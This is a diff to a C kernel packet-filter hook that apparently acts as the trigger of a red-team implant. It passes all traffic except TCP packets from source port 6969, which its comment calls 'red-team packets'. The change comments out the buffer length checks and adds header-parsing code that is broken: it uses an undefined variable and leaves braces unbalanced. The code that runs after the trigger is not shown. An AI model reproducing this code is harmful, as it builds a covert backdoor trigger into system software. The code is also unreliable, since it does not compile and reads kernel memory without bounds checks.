@@ -39,28 +39,34 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     // Ensure mbuf is valid
     if (m == NULL) return PFIL_PASS;;
 
-    // Make sure the packet has enough data for an IP header
-    if (m->m_len < sizeof(struct ip)) {
-        m = m_pullup(m, sizeof(struct ip));
-        if (m == NULL) return PFIL_PASS;;
-    }
+    // // Make sure the packet has enough data for an IP header
+    // if (m->m_len < sizeof(struct ip)) {
+    //     m = m_pullup(m, sizeof(struct ip));
+    //     if (m == NULL) return PFIL_PASS;;
+    // }
    
-    // Extract the IP header
-    ip_header = mtod(m, struct ip *);
-    // Check if it's a TCP packet
-    if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
+    // // Extract the IP header
+    // ip_header = mtod(m, struct ip *);
+    // // Check if it's a TCP packet
+    // if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
 
-    // Extract the TCP header
-    tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));
-    // Check source port
-    if (ntohs(tcp_header->th_sport) != TRIGGER_PORT) return PFIL_PASS;;
+    // // Extract the TCP header
+    // tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));
+    // // Check source port
+    // if (ntohs(tcp_header->th_sport) != TRIGGER_PORT) return PFIL_PASS;;
 
-    // Ensure there's enough data for TCP header
-    if (m->m_len < (ip_header->ip_hl << 2) + sizeof(struct tcphdr)) {
-        m = m_pullup(m, (ip_header->ip_hl << 2) + sizeof(struct tcphdr));
-        if (m == NULL) return PFIL_PASS;;
+    // // Ensure there's enough data for TCP header
+    // if (m->m_len < (ip_header->ip_hl << 2) + sizeof(struct tcphdr)) {
+    //     m = m_pullup(m, (ip_header->ip_hl << 2) + sizeof(struct tcphdr));
+    //     if (m == NULL) return PFIL_PASS;;
+    // }
+
+    struct ip *ip_header = mtod(mbuf, struct ip *);
+    if (ip_header->ip_p == IPPROTO_TCP) {
+        struct tcphdr *tcp_header = (struct tcphdr *)((u_char *)ip_header + (ip_header->ip_hl << 2));
+        if (ntohs(tcp_header->th_sport) != 6969) {
+            return PFIL_PASS;
     }
-
 
 
     // now we know the packet is a red-team packet
